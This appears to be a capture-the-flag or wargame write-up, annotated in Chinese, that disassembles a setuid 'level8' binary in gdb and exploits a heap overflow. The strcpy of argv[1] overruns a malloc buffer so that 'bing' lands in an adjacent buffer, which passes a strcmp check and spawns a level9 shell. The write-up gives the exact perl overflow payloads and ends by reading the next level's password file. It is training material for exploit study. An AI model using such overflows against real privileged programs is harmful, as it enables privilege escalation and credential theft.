
(gdb) disass main
Dump of assembler code for function main:
0x080484dc <main+0>:    push   %ebp
0x080484dd <main+1>:    mov    %esp,%ebp
0x080484df <main+3>:    sub    $0x38,%esp
0x080484e2 <main+6>:    and    $0xfffffff0,%esp
0x080484e5 <main+9>:    mov    $0x0,%eax
0x080484ea <main+14>:   add    $0xf,%eax
0x080484ed <main+17>:   add    $0xf,%eax
0x080484f0 <main+20>:   shr    $0x4,%eax
0x080484f3 <main+23>:   shl    $0x4,%eax   /* eax = 16 */
0x080484f6 <main+26>:   sub    %eax,%esp
0x080484f8 <main+28>:   movl   $0x0,-0xc(%ebp) /* ebp - 0xc = 0 */
0x080484ff <main+35>:   sub    $0xc,%esp 
0x08048502 <main+38>:   push   $0x6ae4   /* 0x6ae4 = 27364*/
0x08048507 <main+43>:   call   0x80483e4 <malloc@plt>
0x0804850c <main+48>:   add    $0x10,%esp
0x0804850f <main+51>:   mov    %eax,-0x10(%ebp) /* malloc返回值(0x0804a008)保存到ebp - 0x10 */
0x08048512 <main+54>:   sub    $0xc,%esp
0x08048515 <main+57>:   push   $0xdd6   /* 0xdd6 = 3542 */
0x0804851a <main+62>:   call   0x80483e4 <malloc@plt>
0x0804851f <main+67>:   add    $0x10,%esp
0x08048522 <main+70>:   mov    %eax,-0x14(%ebp) /* ebp - 0x14 = eax , eax = 0x08050af0 */
0x08048525 <main+73>:   mov    0x8048728,%eax
0x0804852a <main+78>:   mov    %eax,-0x28(%ebp) /* ebp - 0x28 = 0x676e6962 */
0x0804852d <main+81>:   mov    0x804872c,%al
0x08048532 <main+86>:   mov    %al,-0x24(%ebp) /* ebp - 0x24 = 0xbfffdb00 */
0x08048535 <main+89>:   cmpl   $0x1,0x8(%ebp) /* 比较argc 是否大于1 */
0x08048539 <main+93>:   jg     0x804855a <main+126>
0x0804853b <main+95>:   sub    $0x8,%esp
0x0804853e <main+98>:   mov    0xc(%ebp),%eax
0x08048541 <main+101>:  pushl  (%eax)
0x08048543 <main+103>:  push   $0x804872d
0x08048548 <main+108>:  call   0x80483c4 <printf@plt>
0x0804854d <main+113>:  add    $0x10,%esp
0x08048550 <main+116>:  sub    $0xc,%esp
0x08048553 <main+119>:  push   $0xffffffff
0x08048555 <main+121>:  call   0x8048404 <exit@plt>
0x0804855a <main+126>:  sub    $0x8,%esp
0x0804855d <main+129>:  push   $0x8048740  /* strcpy source: "A" */
0x08048562 <main+134>:  pushl  -0x10(%ebp) /* strcpy dest : 第一个malloc分配的内存 */
0x08048565 <main+137>:  call   0x80483b4 <strcpy@plt>
0x0804856a <main+142>:  add    $0x10,%esp
---Type <return> to continue, or q <return> to quit---
0x0804856d <main+145>:  sub    $0x8,%esp
0x08048570 <main+148>:  push   $0x8048742  /* strcpy source: "" 空字符串*/
0x08048575 <main+153>:  pushl  -0x14(%ebp)   /* strcpy dest: 第二个malloc分配的内存 */
0x08048578 <main+156>:  call   0x80483b4 <strcpy@plt> /* 把空字符串拷贝到第二个malloc的内存中 */
0x0804857d <main+161>:  add    $0x10,%esp
0x08048580 <main+164>:  cmpl   $0x1,0x8(%ebp) /* 再次比较argc与1的大小 */
0x08048584 <main+168>:  jle    0x804859c <main+192> /* argc <= 1*/ 
0x08048586 <main+170>:  sub    $0x8,%esp
0x08048589 <main+173>:  mov    0xc(%ebp),%eax
0x0804858c <main+176>:  add    $0x4,%eax
0x0804858f <main+179>:  pushl  (%eax)    /*strcpy source: argv[1] */
0x08048591 <main+181>:  pushl  -0x10(%ebp) /* strcpy dest: 第一个malloc分配的内存，它的大小为27364  */
0x08048594 <main+184>:  call   0x80483b4 <strcpy@plt>
0x08048599 <main+189>:  add    $0x10,%esp
0x0804859c <main+192>:  mov    -0x14(%ebp),%eax /* 第二个malloc分配的内存 */
0x0804859f <main+195>:  mov    %eax,-0x2c(%ebp) /* ebp - 0x2c = 第二个malloc分配的地址： 0x08050af0 */
0x080485a2 <main+198>:  lea    -0x28(%ebp),%eax 
0x080485a5 <main+201>:  sub    $0x8,%esp
0x080485a8 <main+204>:  pushl  -0x2c(%ebp)  /* 第二个malloc分配的地址 */
0x080485ab <main+207>:  push   %eax         /* eax 就是上面保存0x676e6962的地方: 0xbfffda50对应字符串"bing" */
0x080485ac <main+208>:  call   0x80483f4 <strcmp@plt> 
0x080485b1 <main+213>:  add    $0x10,%esp
0x080485b4 <main+216>:  mov    %eax,-0xc(%ebp) /* eax = 0x1 */
0x080485b7 <main+219>:  cmpl   $0x0,0x8(%ebp) /* 比较argc与0的大小 */
0x080485bb <main+223>:  jg     0x80485d7 <main+251> /* argc <= 0 则退出 */
0x080485bd <main+225>:  sub    $0xc,%esp
0x080485c0 <main+228>:  push   $0x8048743
0x080485c5 <main+233>:  call   0x80483c4 <printf@plt>
0x080485ca <main+238>:  add    $0x10,%esp
0x080485cd <main+241>:  sub    $0xc,%esp
0x080485d0 <main+244>:  push   $0xffffffff
0x080485d2 <main+246>:  call   0x8048404 <exit@plt>
0x080485d7 <main+251>:  cmpl   $0x0,-0xc(%ebp) /* 比较strcmp的返回值与0的大小,也就是看strcmp比较两个字符串是否相同*/
0x080485db <main+255>:  je     0x80485ef <main+275>  /* 相同则成功，不相同就失败 */
0x080485dd <main+257>:  sub    $0xc,%esp
0x080485e0 <main+260>:  push   $0x8048755
0x080485e5 <main+265>:  call   0x80483c4 <printf@plt>
0x080485ea <main+270>:  add    $0x10,%esp
0x080485ed <main+273>:  jmp    0x8048652 <main+374>
0x080485ef <main+275>:  sub    $0xc,%esp
0x080485f2 <main+278>:  push   $0x804875f
0x080485f7 <main+283>:  call   0x80483c4 <printf@plt>
---Type <return> to continue, or q <return> to quit---
0x080485fc <main+288>:  add    $0x10,%esp
0x080485ff <main+291>:  sub    $0xc,%esp
0x08048602 <main+294>:  push   $0x8048768
0x08048607 <main+299>:  call   0x80483c4 <printf@plt>
0x0804860c <main+304>:  add    $0x10,%esp
0x0804860f <main+307>:  sub    $0x4,%esp
0x08048612 <main+310>:  sub    $0xc,%esp
0x08048615 <main+313>:  call   0x8048414 <geteuid@plt>
0x0804861a <main+318>:  add    $0xc,%esp
0x0804861d <main+321>:  push   %eax
0x0804861e <main+322>:  sub    $0x8,%esp
0x08048621 <main+325>:  call   0x8048414 <geteuid@plt>
0x08048626 <main+330>:  add    $0x8,%esp
0x08048629 <main+333>:  push   %eax
0x0804862a <main+334>:  sub    $0x4,%esp
0x0804862d <main+337>:  call   0x8048414 <geteuid@plt>
0x08048632 <main+342>:  add    $0x4,%esp
0x08048635 <main+345>:  push   %eax
0x08048636 <main+346>:  call   0x80483a4 <setresuid@plt>
0x0804863b <main+351>:  add    $0x10,%esp
0x0804863e <main+354>:  sub    $0x4,%esp
0x08048641 <main+357>:  push   $0x0
0x08048643 <main+359>:  push   $0x0
0x08048645 <main+361>:  push   $0x8048781
0x0804864a <main+366>:  call   0x80483d4 <execve@plt>
0x0804864f <main+371>:  add    $0x10,%esp
0x08048652 <main+374>:  mov    $0x0,%eax
0x08048657 <main+379>:  leave  
0x08048658 <main+380>:  ret    
End of assembler dump.
(gdb) 

总共使用malloc分配了两块内存，并用第二块内存的内容与字符串"bing"比较，相同则成功，其中通过strcpy
向第一块内存拷贝我们的输入(argv[1])，我们可以通过溢出第一块内存来覆盖第二块内存的内容，从而达到
修改第二块内存的目的。
第一块内存的大小27364

(gdb) r $(perl -e 'print"A"x(27380)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level8/level8 $(perl -e 'print"A"x(27380)')

Breakpoint 2, 0x08048594 in main ()
0x08048594 <main+184>:   e8 1b fe ff ff call   0x80483b4 <strcpy@plt>
(gdb) ni
0x08048599 in main ()
0x08048599 <main+189>:   83 c4 10       add    $0x10,%esp 
(gdb) x/8x 0x08050af0  (查看第二块内存的内容，已经被0x41部分覆盖)    
0x8050af0:      0x41414141      0x41414141      0x41414141      0x00000000
0x8050b00:      0x00000000      0x00000000      0x00000000      0x00000000

(gdb) r $(perl -e 'print"A"x(27368)."BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level8/level8 $(perl -e 'print"A"x(27368)."BBBB"')

Breakpoint 2, 0x08048594 in main ()
0x08048594 <main+184>:   e8 1b fe ff ff call   0x80483b4 <strcpy@plt>
(gdb) ni
0x08048599 in main ()
0x08048599 <main+189>:   83 c4 10       add    $0x10,%esp
(gdb) x/8x 0x08050af0 ("BBBB" 刚好覆盖第二块内存的头四个字节)                      
0x8050af0:      0x42424242      0x00000000      0x00000000      0x00000000
0x8050b00:      0x00000000      0x00000000      0x00000000      0x00000000

(gdb) r $(perl -e 'print"A"x(27368)."bing"')
Starting program: /tmp/level8/level8 $(perl -e 'print"A"x(27368)."bing"')
You win
Spawning shell bitch...
Executing new program: /proc/4052/exe      ("溢出成功")
/proc/4052/exe: Permission denied.
(gdb) 


[level8@logic level8]$ ./level8 $(perl -e 'print"A"x(27368)."bing"')
You win
Spawning shell bitch...
bash-3.2$ whoami
level9
bash-3.2$ more /home/level9/.pass
ahLa2Ahx
bash-3.2$ 